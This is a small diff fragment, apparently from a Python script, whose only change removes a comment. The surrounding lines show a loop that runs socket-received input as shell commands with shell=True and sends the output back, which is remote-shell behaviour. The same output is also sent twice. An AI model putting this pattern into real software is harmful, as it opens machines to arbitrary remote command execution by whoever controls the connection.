@@ -75,7 +75,7 @@ Manual:
             output = subprocess.run(data, shell=True, capture_output=True, text=True)
             send_data(s, output.stdout)
             if output.stdout:
-                send_data(s, output.stdout)  # Send the standard output
+                send_data(s, output.stdout)
             if output.stderr:
                 send_data(s, f"\n[ERROR] Command failed: {output.stderr}\n")
 
